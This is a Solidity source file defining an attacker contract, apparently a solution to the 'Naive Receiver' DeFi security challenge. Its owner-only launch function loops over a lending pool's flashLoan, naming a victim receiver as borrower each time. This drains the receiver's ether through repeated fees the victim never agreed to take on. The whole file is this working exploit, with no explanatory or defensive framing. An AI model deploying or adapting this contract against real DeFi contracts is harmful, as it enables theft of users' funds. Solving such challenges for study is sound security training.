// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    address private immutable pool;
    address private immutable receiver;
    address private immutable owner;

    constructor(address _pool, address _receiver) payable {
        pool = _pool;
        receiver = _receiver;
        owner = msg.sender;
    }
    receive () external payable {}

    function launch(uint256 counter) external {
        require(msg.sender == owner, "only owner");
        IPool ipool = IPool(pool);
        for(uint256 i=0;i<counter;i++){
            ipool.flashLoan(receiver,1 ether);
        }
    }

}
